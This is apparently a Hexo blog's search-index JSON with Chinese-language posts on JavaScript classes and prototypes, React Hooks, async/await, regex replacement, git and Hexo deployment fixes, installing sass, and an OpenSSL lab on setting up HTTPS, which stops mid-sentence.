{"pages":[],"posts":[{"title":"JS 的 class 中成员方法定义的小细节","text":"本文主要介绍了在 ES6 中新增的 class 中定义成员方法的三种方式, 以及各自的 this 指向问题。 在类里面定义成员方法有三种方式，代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html lang='zh'&gt;&lt;head&gt; &lt;meta charset='UTF-8'&gt; &lt;meta http-equiv='X-UA-Compatible' content='IE=edge'&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; class Person { constructor(name) { this.name = name; } // 方式一 say() { console.log('this is say', this); } // 方式二 say2 = function (params) { console.log('this is say2', this); } // 方式三 say3 = () =&gt; { console.log('this is say3', this); } } console.dir(Person); var chen = new Person('chen'); console.log(chen); chen.say() chen.say2() chen.say3() &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button&gt;chen.say&lt;/button&gt; &lt;button&gt;chen.say2&lt;/button&gt; &lt;button&gt;chen.say3&lt;/button&gt; &lt;script&gt; var bt = document.querySelectorAll('button'); bt[0].addEventListener('click', chen.say); bt[1].addEventListener('click', chen.say2); bt[2].addEventListener('click', chen.say3); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 依次点击三个按钮后，控制台截图如下： 方法名后直接跟括号以及大括号，即上述的 say(){}。 这种方式定义的方法会放在类的原型对象 (Person.prototype ) 上，用类定义实例对象时并不会放到实例对象中。实例对象调用该方法时会通过原型链（ chen.__proto__ ）查找到类的原型对象上，从而找到该方法。方法中的 this 会指向调用该方法的对象。比如上例中的 chen.say() 是由实例对象 chen 调用，因此 this 指向 chen 。而当该方法最为按钮的点击事件被调用时， this 则会指向触发事件的按钮 bt。 say2 = function(){}。这种方式，我也不知道它把方法存在哪去了，反正打印 Person 类是找不到的，但是反正最后会直接放在实例对象中。这种方式定义的方法的 this 指向和上一种相同，就不多说了。 箭头函数方式，say3=()=&gt;{}。这种方式在 React 的类式组件中最常用了。方法体也是直接放在实例对象中。最大的特点是用了箭头函数，因此 this 指向的是定义方法的上下文的 this ，就结果而言，其实也就是类的实例对象。不管是谁调用，就算用 call() 和 bind()， this 指向都不会变。","link":"/2021/11/15/JS%E7%9A%84class%E4%B8%AD%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E5%AE%9A%E4%B9%89%E7%9A%84%E5%B0%8F%E7%BB%86%E8%8A%82/"},{"title":"JS 原型链","text":"本文主要介绍了 JS 中的原型链以及一些个人对原型链的理解。 首先 pink 老师给的原型链如上图，有些小细节需要注意: prototype称为显示原型 __proto__ 称为隐式原型，ES6 之前不能直接操作隐式原型 Object.prototype instanceof Object的返回值是 false，但 typeof(Object.prototype) 返回值则是 object, 这是因为 instanceof 原理是查找前面的参数的原型链看是否有后面的参数的prototype，但是Object.prototype 继续查 __proto__ 只能查到 null，所以返回 false 再有 null 和 undefined 的区别，阮一峰博客里的说法是: null 表示”没有对象”，即该处不应该有值。 undefined 表示”缺少值”，就是此处应该有一个值，但是还没有定义。 个人理解是 null 相当于占位符，即考虑到了这个，也定义了，但他就不该有值，因此是 null；但 undefined 往往是压根就没考虑过这个值，即“未定义”。 还有就是打印 Object.prototype 得到结果如下： 压根找不到 __proto__:null 这一项，个人理解是单纯没有显示出来，因为尝试打印了一个乱码结果如下： 可以看到返回值是 undefined 而不是 null 而打印 Object.prototype.__proto__ 结果则是 null： 最后，关于 Object.__proto__, Object 作为 js 中的构造函数，那么它必然是个函数对象，既然是函数对象，那么它的隐式原型__proto__ 自然就是指向Function.prototype。 同理，任意一个构造函数的隐式原型都是 Function 的prototype 此外，Function 的 prototype 和 __proto__ 是一样的 所以最后原型链图我补充了一下：","link":"/2021/11/18/JS%E5%8E%9F%E5%9E%8B%E9%93%BE/"},{"title":"git push&#x2F;clone 操作失败的解决方法","text":"本文主要介绍自己之前遇到的 git push 和git clone总是失败的解决办法。 问题描述 之前刚开始尝试使用 git 操作的时候，git push 操作总是失败，一会报错是请求超时，一会报错是拒绝访问，然后最近刚开始写博客时，用到了 git clone，结果还是一样的问题。 之前也百度了很多方法，主要就三种： 修改 host 文件 关闭代理 忽略代理 我的确有开着代理，clash 一直在后台运行着。但实测无论开不开代理，开规则模式或者全局模式，网页都能正常访问 github，但是 git 操作就是死活不成功。然后使用 git 命令忽略代理，还是没效果。host 懒得改了，所以没试。总之都不行。 我试了有十几次，离谱的发现，报错还是随机的。在不开代理的情况下连续尝试了好几次git push，有几次是显示请求超时，有几次是拒绝访问，然后竟然还有那么一两次是可以成功的。反正当时我就这么类似卡 BUG 一样 勉强搞定了。 然后搭博客要用到git clone，不出所料依然一样的问题。这次又搜了搜，意外的发现还可以给 git 操作设置代理，然后就神奇的解决了……意外的很轻松呢，当时我可是纠结了几小时都没搞定啊。 解决方法 很简单，就给 git 设置代理就行了，命令如下： git config --global http.proxy &quot;localhost:port&quot; 这里的 port 端口是代理的端口，代理软件是 clash 的话，就是首页显示的这个 port。 然后就没有然后了。 当然，如果哪天不需要代理了，也可以用下面的命令关闭代理： git config --global --unset http.proxy ​ 其实到最后我也没搞清楚问题原因，个人猜测可能是 git push/clone 这两个操作请求的服务器被墙了吧，我这里宽带是联通的。至于为什么 github 网页能正常访问，emm，谁知道呢。 附上找到这个方法的文章链接： https://www.jianshu.com/p/471aeba64724","link":"/2021/11/18/git-push-clone%E6%93%8D%E4%BD%9C%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"},{"title":"React 中 Hook 的简单使用","text":"本文简单介绍了 React 16.8 中新增的 State Hook 和 Effect Hook 的使用。 前言 以往用 React 做项目时，都会用类式组件来实现一些较为复杂的组件，函数式组件只能用于实现一些功能简单的组件。原因大概在于，函数式组件只能使用 props(作为函数的参数传入)，而不能像类式组件一样使用 state 和 refs。同时，类式组件还有生命周期钩子，比如常用的 componentDidMount() 和componentWillUnmount()，能够分别在组件挂载后和卸载前执行某些操作，函数式组件也没有。 但是类式组件也有它自身的很多问题，具体可以看React 官方文档，因此 React 在 16.8 版本中新增了 Hook。它可以在不编写 class 的情况下使用 state 以及其他的 React 特性。 Hook 的复杂运用我也不太会，但是还是可以说说最基本的两个 Hook：State Hook 和 Effect Hook。 State HookState Hook 是为了在函数式组件中使用 state 而设计的。以往在类式组件中，我们要用 state 得这么写： 12345678910111213141516import React, { Component } from 'react'export default class test extends Component { state={count:0} changeCount = () =&gt; { console.log(this.state.count) // 获取 count 并输出 this.setState({count:1}) // 修改 count } render() { return ( // ... ) }} 有了 State Hook，就可以这么写： 123456789101112131415import React，{useState} from 'react'export default function test() { const [count, setCount] = useState(0) changeCount = () =&gt; { console.log(count) // 获取 count 并输出 setCount(1) // 修改 count } return ( // ... )} 可以看到，定义 state 只需要 const [count, setCount] = useState(0)。这里用到了数组的解构赋值，具体来说，useState() 的返回值是一个有两个元素的数组，第一个元素就赋值给了 count，第二个元素就赋值给了setCount，要注意的是，这里的setCount 是一个用于修改对应 state 的函数。useState()的参数就是这个 state 的初值，比如这里就是给 count 赋初值 0。 使用 state 时就直接用 count 就行了，不用再麻烦的 this.state.count 了。修改 state 只需要调用该 state 对应的 setXXX() 就行，这里就是setCount(1)，括号里的参数就是要修改成的值。 但是要注意，setCount()不仅可以直接传值作为参数，也可以传函数作为参数，形如 setCount(count=&gt;count+1)。这里的 count 就是setCount() 对应的 state，虽然直接写 setCount(count+1) 也可以，但是如果是函数的形式，每次调用 setCount(count=&gt;count+1)，它都会自动获取到当前的最新的 count 值并传给子函数进行加一操作（其实是子函数返回的结果作为参数），如果用setCount(count+1) 的形式，这里的 count 其实是从上下文获取的，如果上下文的 count 不是直接就是对应的 state 而是通过参数传进来的话，可能会不能及时更新，导致 setCount() 结果不对。这里就不举例了，因为我也搞不懂啥时候会出错。总之，保险起见，用函数形式参数最安全，反正也就多敲几个字符而已，不是很麻烦。 12345678910function Demo(){ const [count, setCount] = useState(0) setInterval(()=&gt;{ console.log(count) setCount(count+1) },1000) return } 如果要多个 state，那就多用几次 useState() 就行，每次赋值给不同名称的参数即可。只要记住 state 都是两两成对，修改 state 必须用对应的方法就行。 Effect HookEffect Hook 又叫做副作用钩子，用于在函数组件中实现声明周期钩子的效果。 用法如下： 123456789101112131415161718import React, { useEffect}from 'react'export default function test() { useEffect(() =&gt; { // effect return () =&gt; { // cleanup } }, [deps]) return ( &lt;div&gt; &lt;/div&gt; )} useState()一个函数就能实现 componentDidMount() 、componentWillUnmount()、componentDidUpdate(prevProps, prevState) 三个函数的功能。 useState()的参数有两个，第一个是函数，第二个是数组。 写在函数体中的内容效果相当于 componentDidMount() 和componentDidUpdate()，也就是，组件每次更新就会执行一次，包括首次挂载时。函数的返回值也是一个函数，其中的效果与 componentWillUnmount() 相同，会在组件卸载前执行。 然后是第二个数组参数，也可以叫做“依赖数组（dependency array）”。 前面提到，函数体中的内容首次挂载和每次更新后都会执行，但这样就会有很多不必要的麻烦。比如：我想在函数首次挂载时发送 ajax 请求来获取数据。如果直接写在函数体中，则就会陷入：首次挂载 → 发送请求 → 数据更新 → 组件更新 → 发送请求 → 数据更新 → 组件更新 → … 的死循环。 而依赖就可以避免这个问题。函数体中的内容，只会在依赖数组中的值更新时才会调用，如果组件更新了但该数组中的元素的值并没有变化，则不会执行函数内容。 具体而言，可以看下面的例子： 12345678910111213141516171819202122232425262728import axios from 'axios'import React, { useState, useEffect } from 'react'export default function HookTest() { const [data, setData] = useState(null) const [count, setCount] = useState(0) async function getData(params) { const data = await axios.get('http://localhost:8080/home/swiper') console.log(data); setData(data.data.body); } // 第二个参数数组中的元素，应该最好是 state，因为只有 state 更新了才会请求重新渲染组件，从而利用第二个参数判断要不要重新渲染， // 如果不是 state，不管怎么修改都不会发起重新渲染的请求，也就没有意义了 // 如果只需要第一次挂载时执行，第二个参数设为[] 即可 useEffect(() =&gt; { getData(); }, [count]) return ( &lt;div&gt; &lt;button onClick={() =&gt; { setCount(count + 1) }}&gt; 点我发送请求&lt;/button&gt; &lt;/div&gt; )} 这个例子就实现了 首次挂载时 以及 点击按钮后 发送请求的功能。 首次挂载必定会发送请求，这没什么好说的。重要的实现点击按钮发送请求且不会因为更新了 data 而更新组件继而又发送请求。 这里用到了名为 count 的 state： 点击按钮 → setCount(count + 1) → 修改了 state 从而更新组件 → 更新后 useEffect() 判断 count 是否和上一次的值相同 → 不同（加了 1），因此执行函数体内容，即发送请求 → 得到新数据，更新 data → data 也是 state，组件再次更新 → 但是这次 count 没变，因此不会再次执行函数体内容。 P.S. 我觉得一般情况下没人会像我上面那么写，正常做法应该是将发送请求单独写在一个函数里，然后在 useState() 第一个参数的函数体里调用一次，第二个参数数组设为[]，然后再单独给按钮的点击事件绑定这个函数。 Tips实测发现，如果不写useEffect()， 每次调用上一节定义的setCount()，函数组件都会更新一次，这跟类式组件差不多。但是，每次更新函数组件，它都会重新执行一遍其中的代码。 比如，如果函数里面写了一个setInterval()，且在该定时器里面调用了setCount()，那就会发现，每次更新组件都会多出一个计时器，计时器变多了组件更新的就更频繁，计时器增加的速度就更快，以此类推。 这肯定是不行的，所以这类只需要首次挂载时执行的代码，最好写在 useEffect 里，并且将依赖数组设为空数组（但是写空数组 react 会警告，所以干脆直接不写第二个参数即可）。 自定义 Hook自定义 hook 的目的往往是为了将可以复用的逻辑代码从组件中抽离出来，单独封装为一个 Hook。 Hook 只能在 react 函数的最顶层使用，而 react 函数就只有两种：函数式组件以及自定义 hook。为了能够让 react 判断我们自己定义的函数是自定义 hook，避免报错，自定义 hook 的函数名必须以 use 开头，形如 useXxx 的形式。 下面以封装 useState() 和useEffect()为例，见到那介绍一下自定义 hook 的用法。 封装 useState() 上面介绍 useState() 时，写了如下的代码： 1234567891011121314import React，{useState} from 'react'export default function test() { const [count, setCount] = useState(0) changeCount = () =&gt; { console.log(count) // 获取 count 并输出 setCount(1) // 修改 count } return ( // ... )} 其中的 changeCount() 就是逻辑代码，可以按如下方式抽离出来： 123456789101112131415161718192021import React，{useState} from 'react'function useCount(initValue){ const [count, setCount] = useState(initValue) changeCount = () =&gt; { console.log(count) // 获取 count 并输出 setCount(1) // 修改 count } return [count,changeCount]}export default function test() { const [count,setCount] = useCount(0) return ( // ... // 此处直接调用 setCount() 就能实现将 count 变为 1 )} 这样封装后，组件中就不需要考虑要怎么处理 count 数据，只需要调用 setCount() 即可。如果有多个组件需要这要操作 count，只需调用该 hook 即可，这样就实现了复用。同时，在同一个组件中也可以多次调用上面定义的useCount(), 每次调用后产生的 count 互相独立，互不影响，只需要在组件里用不同的变量名来接就行了，比如 count1、count2 之类。 封装 useEffect() 封装 useEffect() 的操作其实也差不多： 123456789101112131415161718192021import React, { useEffect}from 'react'function useMyeffect(){ useEffect(() =&gt; { // effect return () =&gt; { // cleanup } }, [input])}export default function test() { useMyeffect() return ( &lt;div&gt; &lt;/div&gt; )} 上面就是最简单的封装了useEffect()，可以简单的实现代码复用。 当然，一般应该不会这么简单吧，比如 react 官方文档 就同时封装了 useState() 和useEffect()在一个 hook 中。就我自己举的例子里，其实也可以传一些参数给useMyeffect()，甚至可以直接传一个函数进去，在内部调用，这样能实现的功能就更多了。但是，这毕竟只是最简单的一个例子而已，简简单单才好理解嘛。 自定义 hook 中 useEffect() 的执行时机 封装了 useEffect(), 很自然的就会有一个问题：自定义 hook 中的useEffect()，它的各个部分的执行时机是什么时候？我是谷歌搜了半天都没看到有确切的回答。但是注意到，react 官方文档中的例子里，封装useEffect() 的时候，是原封不动的把原先组件中的代码复制进去的，只在最后添加了一个 return。既然原封不动的拷贝都不会改变组件的功能，那自然，封装之后的 useEffect() 执行时机肯定和直接写在组件里相同。 结尾Hooks 应该是大势所趋吧，但肯定不可能就我上面写的那么点内容。之后还是要多研究研究才行。 附：React 官方文档","link":"/2021/11/19/React%E4%B8%ADHook%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"},{"title":"hello hexo","text":"这是用 hexo 搭建博客后写的第一篇博文","link":"/2021/11/15/hello-hexo/"},{"title":"hexo deploy 执行失败的解决方法","text":"为了能上传这篇文章浪费了两个多小时。 问题描述 hexo deploy 突然没法执行成功了，报错如下： 很明显是 git 操作又出了问题，看描述是没有写权限。 百度了半天，全是说用户名密码出了问题，重新设置一下就好。但是一点用都没有。还有说获取个 token 就行的，试了也没用，报错还变了： 总之将近两小时一事无成。 解决方法 换用 ssh，不用 https 了。 首先要获取一个 ssh，教程在这，只要看怎么获取 SSH Key 并绑定到 github 上就行了。 然后复制仓库的 ssh 地址： 再粘贴到 hexo 的 _config.yml 中，位置及格式如下（branch 可有可无）： 然后就 OK 啦，直接 hexo deploy 就行了。","link":"/2021/11/19/hexo-deploy%E6%89%A7%E8%A1%8C%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"},{"title":"好客租房项目的小笔记 (三)","text":"本文介绍了 react 中使用 onClick={} 绑定事件处理函数的几种情况。 关于 onClick={} 的问题 简单来说，有三种情况： 不需要传参，不需要获取触发事件的元素本身。这时直接写函数名即可，不需要使用箭头函数。 123function f(){}&lt;div onClick={f} /&gt; 切记千万不能写成 onClick={f()}，加了括号就会直接调用且只会调用一次。不加括号意味着是将函数体放在那。 不需要传参，但需要获取触发事件的元素本身。 12345function f(e){ //event.currentTarget 就是绑定的元素本身}&lt;div onClick={(e)=&gt;f(e)} /&gt; 需要注意的是，箭头函数的右侧不要写花括号，f(e) 是返回值，箭头函数只有返回值时可以同时省略 return 和 {} 。 或者也可以直接写成： 123function f(e){}&lt;div onClick={f} /&gt; 需要传参。 1234function f(){}let a=0&lt;div onClick={()=&gt;f(a)} /&gt; 参数的来源暂且不论，一般来说根据函数的闭包直接写 f(a) 即可","link":"/2021/11/15/%E5%A5%BD%E5%AE%A2%E7%A7%9F%E6%88%BF%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%B0%8F%E7%AC%94%E8%AE%B0-%E4%B8%89/"},{"title":"好客租房项目的小笔记 (一)","text":"本文主要介绍了 ES6 中新增的 async/await 的用法，顺便提及了 promise 的用法。 await 的知识点 await 其实只是替代了promise.then() 方法，但是还是没法省略掉 promise 对象。await 的后面必须跟一个 promise 对象，跟的是函数的话函数的返回值也要是 promise 对象。所以如果异步操作的函数里面没有返回 promise 对象，那还是得自己再包一层函数，将异步操作放在 return 的 promise 对象里才行。 比如 var data=await setTimeout(()={//...}) 是不行的，因为 await 后面跟的不是 promise 对象，需要写成: 12345678async function f3() { var data = await new Promise((resolve) =&gt; { setTimeout(() =&gt; { resolve('time over') }, 500); }) console.log(data);} 注意 await 要用在函数里面，函数外侧需要有 async;还有就是 promise 内必须要调用 resolve() 或者 reject() 方法 总之, promise 是躲不掉的 原先接 promise 的返回值是要 promise.then((data)=&gt;{ //... }) 这样写就有点麻烦，用了 await 就成了： 12var data=await promise//... 可以看到 data 就直接拿到外面来了，下面再写对 data 的处理，这样看起来就像普通的同步操作一样，这也就是 await 最大的用处。 还有就是，async 函数的返回值是 Promise 对象，也就是说，await 后面可以直接跟一个用 async 修饰的函数。 Promise 对象内部也是单线程的，异步操作也是放在最后执行，所以 resolve() 不能直接写在异步操作外面，这样会先执行 resolve，后进行异步操作，自然会出问题 当然，即使 resolve 了 promise 内部的操作还会继续执行 比如： 1234567891011121314151617181920async function f5() { var data = await new Promise((resolve) =&gt; { data = 0 setTimeout(() =&gt; { console.log(' 异步操作 '); data = 1 }, 300); console.log(' 同步操作 '); resolve(data) }) console.log(' 外部操作 输出 data:', data);}f5() /* 结果：同步操作 外部操作 输出 data: 0异步操作*/ 可以看到首先执行了 promise 内部的同步操作，接着直接 resolve(data) ，外部在 resolve 后获取到了 data 值（未修改的）继续执行，输出了 data，最后 promise 内部的异步操作结束","link":"/2021/11/15/%E5%A5%BD%E5%AE%A2%E7%A7%9F%E6%88%BF%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%B0%8F%E7%AC%94%E8%AE%B0-%E4%B8%80/"},{"title":"好客租房项目的小笔记 (四)","text":"本文介绍了如何使用正则表达式进行 替换 特定文本。 正则替换 正则表达式除了用于查询之外，还可以用于替换。替换要用到圆括号 () 和 $。 圆括号表示捕获组的意思，本身并不影响匹配，但是在查询时可以实现查找重复内容。比如要查询字符串 abcd123+123efg 中的 123+123 部分，正则表达式可以写成：([0-9]+)\\+\\1 。其中，\\1就代表前面的 ([0-9]+) 匹配到的内容。要注意的是，匹配的是内容而不是正则表达式，也就是说，假如上述字符串为 abcd123+456efg ，那就没法匹配成功，因为 456 和 123 不一样，而 \\1 代表的的是前面的 ([0-9]+) 所匹配到的 123 , 而不是它自身。 接着话题回到替换上。替换基本上也是和上面一样，但是把反斜杠 \\ 换成了 $ , 用于表示要保留的内容（大概）。举个例子，要把 className={styles.mapContainer} 替换成 className='mapContainer' ，查找和替换的正则表达式可以这么写： 12classname=\\{styles.([A-Za-z0-9]+)\\} // 查找className='$1' // 替换 其中的 $1 就代表 ([A-Za-z0-9]+) 所匹配到的内容: mapContainer ，也就是想要保留的部分。要是有多个捕获组，当然也可以用 $2、$3 这类。个人觉得吧，替换的部分可能压根就不能用正则表达式，顶多只能像这样复用一下查找时匹配到的内容吧？ 高软老师的补充： 昨天课后讨论有关捕获组的用法，在匹配时仅适用于重复的字串，比如 219219219 或者 ABC ABC，这样的才能用 \\1 替代捕获组小括号里的匹配结果，在（）+ 这样将捕获组作为一个元素出现 1 次或多次的情况，\\1 代表最后一次匹配结果。 本文其实也用了这种方法替换中英文的逗号：匹配 ([\\u4e00-\\u9fa5]),([\\u4e00-\\u9fa5]) 替换为 $1，$2效果：汉字之间的英文逗号替换为中文逗号","link":"/2021/11/15/%E5%A5%BD%E5%AE%A2%E7%A7%9F%E6%88%BF%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%B0%8F%E7%AC%94%E8%AE%B0-%E5%9B%9B/"},{"title":"好客租房项目的小笔记 (二)","text":"本文主要介绍了 js 中 map() 和forEach()的区别以及为什么 react 要用map()。 关于 React 里面为什么渲染重复组件时用 map() 不用 forEach()首先，arr.map(callback()) 和 arr.forEach(callback()) 都可以遍历数组，二者区别在于，map() 会返回一个新的数组，而 forEach() 则不会。 先看一下项目里的用法吧： 12345678910111213141516171819202122232425renderTabItem() { return tabItems.map((item) =&gt; { return ( &lt;TabBar.Item //... &gt; &lt;/TabBar.Item&gt; ) })}//...render() { return ( &lt;div className=&quot;home&quot;&gt; //... &lt;TabBar&gt; { this.renderTabItem() } &lt;/TabBar&gt; &lt;/div&gt; )}} 以下是个人理解：既然是要渲染 dom 元素，那最后必然要有返回值才行。这里 map() 的回调函数中的 return ，实际上是返回了一个新数组中的一个个元素。也就是说，最后会得到一个元素为 JSX 节点的新数组，然后再经由最外侧的 return 返回给 render() 用于渲染组件（ JSX 会自己把数组中的元素一个个渲染出来）。 如果用 forEach() 的话，没有返回值，所以不行。","link":"/2021/11/15/%E5%A5%BD%E5%AE%A2%E7%A7%9F%E6%88%BF%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%B0%8F%E7%AC%94%E8%AE%B0-%E4%BA%8C/"},{"title":"ES5 中的构造函数与 ES6 中 Class 的关系","text":"众所周知，ES6 中新增的 Class 就是此前的构造函数的语法糖，虽然现在都用 class 很方便，但是面试肯定是会问到构造函数的用法的，因此还是得搞明白。 二者的使用当然是有区别的啦。 构造函数 构造函数和普通函数的区别在于，一般来说，构造函数命名时都是首字母大写的。但这个说到底也只是建议，大小写本身并不会影响函数的性质。任何一个函数，如果使用了new，那它就能实现构造函数的效果，同理，只要不new，首字母大写的函数也能和普通函数一样执行。 1234567function Fn(){ this.name='Fn' console.log(this.name)}Fn()// 控制台输出: Fn 12345678function fn(){ this.name='fn'}var fobj=new fn()console.log(fobj)// 控制台输出: fn {name: &quot;fn&quot;}// 也就是定义了一个 fn 类型的对象 构造函数中，通过 this.xxx 定义成员变量，也就是实例变量，最后会赋值给每一个实例对象。但是测试了一下，构造函数中似乎不能用 static 定义静态变量。静态变量应在函数外部用 FunctionName.xxx=xxx 来定义。 定义成员方法的话，可以直接在函数内部像普通成员变量一样定义，即 this.fn=function(){} 的形式，这样会给每一个实例对象都复制一份这个方法，可能有点浪费空间，因此一般建议放在原型对象上，即 1FunctionName.prototype.xxx=function(){} 这样函数本身就只会有一份，每个实例对象调用该方法时只需查找 原型链 就能找到该方法。 Class Class 的思路其实和上面的一样，只是优化了写法而已。 12345678910111213141516171819202122class Person { constructor(name) { this.name = name; } age=12 // 方式一 say() { console.log('this is say', this); } // 方式二 say2 = function (params) { console.log('this is say2', this); } // 方式三 say3 = () =&gt; { console.log('this is say3', this); }} 上面的代码是从 JS 的 class 中成员方法定义的小细节 中复制过来的，并添加了第 6 行。 可以看到，Class 中多了一个constructor()，学过其他面向对象语言应该很熟悉，这个也叫构造函数。用途其实和之前的构造函数差不多，就是用来初始化成员变量的。 然后是第 6 行的 age=12，class 中，定义成员变量其实也可以不用构造函数，直接写在 class 内，这样也可以省略this 关键词。但是只有 constructor() 的参数能够从外部传入，因此这种写法只能用于初始化不需要从外部获取数据以初始化的成员变量。 成员方法的定义具体可以看JS 的 class 中成员方法定义的小细节，这里就不多赘述了。 new 在执行时会做四件事情： ① 在内存中创建一个新的空对象。 ② 让 this 指向这个新的对象。 ③ 执行构造函数里面的代码，给这个新对象添加属性和方法。 ④ 返回这个新对象（所以构造函数里面不需要 return ）。 顺便，构造函数理论上是用来初始化对象的，也不能 return，因此最好不要在里面写一些过于复杂的逻辑。 但是个人感觉，有的时候也不能太死板。比如要初始化成员变量为数组，且数组内容是 1~999 的数字，总不能呆呆地写个 this.arr=[1,2,3...] 吧？写个循环来初始化也是在所难免的。也不用担心会执行出错，毕竟执行构造函数时和执行普通函数并没有什么区别，无非是自动调用了而已。","link":"/2021/11/28/ES5%E4%B8%AD%E7%9A%84%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E4%B8%8EES6%E4%B8%ADClass%E7%9A%84%E5%85%B3%E7%B3%BB/"},{"title":"React 脚手架中怎么安装 sass(其他包同理)","text":"总之，脚手架里面的 npm 要用局部安装。 最近用 react 脚手架（create-react-app）新创建了一个 react 项目，但是不能使用 .scss 文件，提示 1Cannot find module 'sass' 我试着执行了： 123$ npm i -g sass$ npm i -g sass-loader$ npm i node-sass // 这一条不知道为什么卡住了，没执行成功 但是一点用都没有。后来又看了看之前做好客租房的那个教程，又去看了看create-react-app 官方文档，再结合 stackoverflow 上的回答，好像是搞清楚为啥了。 首先，官方文档推荐的是执行 123$ npm install node-sass --save$ # or$ yarn add node-sass 但毕竟是 19 年的文档，有点过时了。现在 node-sass 好像停止维护了？现在要执行的是： 1$ npm i sass 注意，千万不要加-g，我之所以不能成功就是因为使用了全局安装。全局安装是把包下到 node 的安装目录里，可以让命令行使用，但是不会添加到当前项目的目录下，更不会修改当前项目的配置文件，所以还是没法用。 顺便贴一篇文章，详细介绍了局部安装和全局安装的区别：npm 全局安装和局部安装的区别","link":"/2021/12/04/React%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B8%AD%E6%80%8E%E4%B9%88%E5%AE%89%E8%A3%85sass(%E5%85%B6%E4%BB%96%E5%8C%85%E5%90%8C%E7%90%86)/"},{"title":"利用 OpenSSL 实现 HTTPS","text":"信息安全实践课 实验一 搭建 https 服务 前言 所有的命令行操作，需要确保是用户而不是 root 模式； 其次，遇到 permission denied 就说明需要权限，在对应命令前面加上 sudo 即可； 再其次，很多时候出错了会有提示，仔细看看说不定能知道为什么出错。 正文 首先写贴一下给的教程吧，也就是 Ubuntu 的社区教程：OpenSSL。以及老师（其实应该是学长）给的 PDF 的教程部分： 以上就是全部的资料了。 下面基于文档（的机翻）以及我自己的经验简单写一下流程。 首先当然是要安装 ubuntu 和 OpenSSL 啦，网上搜一下教程一堆。我是直接装的最新版的 ubuntu 20.04，OpenSSL 版本应该是和系统配套的，所以应该也蛮新的。这也导致后面出了好多问题。 在用户目录（比如我就是 /home/iyiak/ ）新建 myCA 文件夹以及内部的两个子文件夹。 1cd &amp;&amp; mkdir -p myCA/signedcerts &amp;&amp; mkdir myCA/private &amp;&amp; cd myCA 在 myCA 目录下创建初始证书数据库 1echo '01' &gt; serial &amp;&amp; touch index.txt 在 myCA 目录里创建caconfig.cnf，这个其实就是后面创建 CA 时的配置文件，可以用命令 1sudo nano ~/myCA/caconfig.cnf 打开 vim 来编辑，内容如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# My sample caconfig.cnf file.## Default configuration to use when one is not provided on the command line.#[ca]default_ca = local_ca### Default location of directories and files needed to generate certificates.#[local_ca]dir = /home/iyiak/myCAcertificate = $dir/cacert.pemdatabase = $dir/index.txtnew_certs_dir = $dir/signedcertsprivate_key = $dir/private/cakey.pemserial = $dir/serial# ## Default expiration and encryption policies for certificates.#default_crl_days = 365default_days = 1825default_md = sha256# policy = local_ca_policyx509_extensions = local_ca_extensions### Copy extensions specified in the certificate request#copy_extensions = copy# ## Default policy to use when generating server certificates. The following# fields must be defined in the server certificate.#[local_ca_policy]commonName = suppliedstateOrProvinceName = suppliedcountryName = suppliedemailAddress = suppliedorganizationName = suppliedorganizationalUnitName = supplied# ## x509 extensions to use when generating server certificates.#[local_ca_extensions]basicConstraints = CA:false# ## The default root certificate generation policy.#[req]default_bits = 2048default_keyfile = /home/iyiak/myCA/private/cakey.pemdefault_md = sha256# prompt = nodistinguished_name = root_ca_distinguished_namex509_extensions = root_ca_extensions### Root Certificate Authority distinguished name. Change these fields to match# your local environment!#[root_ca_distinguished_name]commonName = MyOwn Root Certificate AuthoritystateOrProvinceName = jiangsucountryName = CNemailAddress = abc@abc.comorganizationName = ABC organizationalUnitName = IT Department# [root_ca_extensions]basicConstraints = CA:true 这个是按照文档修改来的，其中 11 行和 57 将文档中的路径改成了自己的 /home/iyiak/myCA/...；24 行和 58 行将加密算法由原来的sha1 改为了sha256，不改的话后面没办法启动 apache2，错误信息大概意思就是不够安全，在室友的电脑上尝试了 Ubuntu 18.04，就不需要修改这个，所以应该是新版的要求更严格了。 然后就是修改了 68 行开始的 [root_ca_distinguished_name]，内容随意吧，差不多就行了，好像countryName 必须是两个字母。 下面的命令设置了一个环境变量 OPENSSL_CONF，它强制openssl 工具在替代位置（在本例中为~/myCA/caconfig.cnf）查找配置文件。 1export OPENSSL_CONF=~/myCA/caconfig.cnf 使用以下命令生成 CA 证书和密钥，CA 证书的参数就是上面的 caconfig.cnf 设置的。 1openssl req -x509 -newkey rsa:2048 -out cacert.pem -outform PEM -days 1825 这一步应该会提示输入密码： 1234567Generating a RSA private key.................................+++.................................................................................................+++writing new private key to '/home/bshumate/myCA/private/cakey.pem'Enter PEM pass phrase:Verifying - Enter PEM pass phrase:----- 一定要记住这里设置的密码，每次要生成和签署新的服务器或客户端证书时都需要它。 上述过程将使用 PEM 格式和 RSA 公钥 / 私钥加密创建自签名证书。该证书的有效期为 1825 天。生成的文件的位置和用途如下： ~/myCA/cacert.pem : CA 公共证书 ~/myCA/private/cakey.pem : CA 私钥 至此为止 CA 部分就完成了。接下来就是要生成签发给服务器的证书。 编辑 ~/myCA/exampleserver.cnf 文件，这里面的内容一定要和网站（本例就是 localhost）一样。 12345678910111213141516171819202122232425## exampleserver.cnf#[req]prompt = nodistinguished_name = server_distinguished_namereq_extensions = v3_req[server_distinguished_name]commonName = localhoststateOrProvinceName = jiangsucountryName = CNemailAddress = cky@abc.comorganizationName = My OrganizationorganizationalUnitName = Subunit of My Large Organization[v3_req]basicConstraints = CA:FALSEkeyUsage = nonRepudiation, digitalSignature, keyEnciphermentsubjectAltName = @alt_names[alt_names]DNS.0 = localhostDNS.1 = 127.0.0.1 这里关键就是 11 行的 